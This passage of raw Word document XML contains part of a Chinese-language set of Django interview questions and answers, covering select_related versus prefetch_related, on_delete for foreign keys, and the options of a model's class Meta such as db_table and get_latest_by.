    <w:p w14:paraId="4F59390B"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xml:space="preserve">#values_list : </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>取元组的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEE294C" w14:textId="2D479A10"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30" w:name="t39"/>
      <w:bookmarkEnd w:id="30"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>04</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9</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selected_related</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>prefetch_related</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>有什么区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B31B54"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Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>   </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在</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中，所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都是惰性的，意思是当创建一个查询集的时候，并没有跟数据库发生任何交互。因此我们可以对查询集进行级联的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等操作，只有在访问</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的内容的时候，</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才会真正进行数据库的访问。而多频率、复杂的数据库查询往往是性能问题最大的根源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2C53BC"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w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不过我们实际开发中，往往需要访问到外键对象的其他属性。如果按照默认的查询方式去遍历取值，那么会造成多次的数据库查询，效率可想而知。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6895348D"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w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在查询对象集合的时候，把指定的外键对象也一并完整查询加载，避免后续的重复查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0DFC95"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1</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select_related</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>适用于外键和多对一的关系查询；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169FC788"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2</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prefetch_related</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>适用于一对多或者多对多的查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB6795C" w14:textId="55D86890"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31" w:name="t40"/>
      <w:bookmarkEnd w:id="31"/>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50</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当删除一个外键的时候，如何把与其关联的对应关系删除？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155A86CE" w14:textId="7484B4FF"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删除关联表中的数据时</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当前表与其关联的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>field</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的操作</w:t>
      </w:r>
      <w:r w:rsidR="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF25225" w14:textId="0BCA8CB5"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#django2.0</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>之后，表与表之间关联的时候</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必须要写</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>on_delete</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</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否则会报异常</w:t>
      </w:r>
      <w:r w:rsidR="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07462FF5" w14:textId="120B0A7F"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32" w:name="t41"/>
      <w:bookmarkEnd w:id="32"/>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51</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class Meta</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的元信息字段有哪些？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAA8DA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通过一个内嵌类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> "class Meta" </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>给你的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> model </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>定义元数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类似下面这样</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C098D6B"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class Foo(models.Model): </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458339D5"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bar = models.CharField(maxlength=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564E72E0"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lastRenderedPageBreak/>
        <w:t>    class Meta: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A99D4B1"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 ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A81518F"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xml:space="preserve">Model </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元数据就是</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不是一个字段的任何数据</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">" -- </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>比如排序选项</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, admin </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>选项等等</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E22AAD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下面是所有可能用到的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Meta </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>选项</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没有一个选项是必需的</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是否添加</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> class Meta </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>到你的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> model </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>完全是可选的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43002C4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app_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78AE9E17"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app_label</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个选项只在一种情况下使用，就是你的模型类不在默认的应用程序包下的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>models.py</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件中，这时候你需要指定你这个模型类是那个应用程序的。比如你在其他地方写了一个模型类，而这个模型类是属于</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>myapp</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的，那么你这是需要指定为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF3C87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app_label='myapp'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5DB36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db_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B939A8"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db_table</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是用于指定自定义数据库表名的。</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有一套默认的按照一定规则生成数据模型对应的数据库表名，如果你想使用自定义的表名，就通过这个属性指定，比如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E5D2F3"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table_name='my_owner_table'   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DA83D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若不提供该参数</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Django </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会使用</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> app_label + '_' + module_name </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作为表的名字</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A011849"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若你的表的名字是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>保留字</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或包含</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名不允许的字符</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特别是连字符</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没关系</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">. Django </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会自动在幕后替你将列名字和表名字用引号引起来</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170D9D6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db_tablespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005C8669"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有些数据库有数据库表空间，比如</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。你可以通过</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>db_tablespace</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来指定这个模型对应的数据库表放在哪个数据库表空间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789D25A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get_latest_by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB9C099"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由于</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的管理方法中有个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>lastest()</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，就是得到最近一行记录。如果你的数据模型中有</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateField </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateTimeField </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类型的字段，你可以通过这个选项来指定</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>lastest()</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是按照哪个字段进行选取的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541E827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一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateField </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
